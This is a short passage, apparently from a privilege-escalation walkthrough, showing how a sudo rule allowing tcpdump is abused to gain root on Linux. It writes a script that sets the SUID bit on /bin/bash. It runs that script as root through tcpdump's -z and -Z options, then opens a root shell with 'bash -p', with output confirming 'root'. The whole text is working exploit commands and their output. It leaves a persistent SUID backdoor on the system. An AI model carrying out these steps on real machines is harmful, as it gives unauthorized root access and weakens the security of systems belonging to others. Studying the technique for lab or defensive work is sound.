
```sh
echo 'chmod +s /bin/bash' > /tmp/pwn.sh  --> normal privileges
chmod +x /tmp/pwn.sh                     --> normal privileges (now every thing is set up, we need to use sudo now)
sudo /usr/sbin/tcpdump -i lo -w /dev/null -W 1 -G 1 -z /tmp/pwn.sh -Z root  --> high privileges.
```

After that you put `SUID` bit on `/bin/bash`, now you can get shell as root using following:
```
/bin/bash -p

bash# whoami
root
```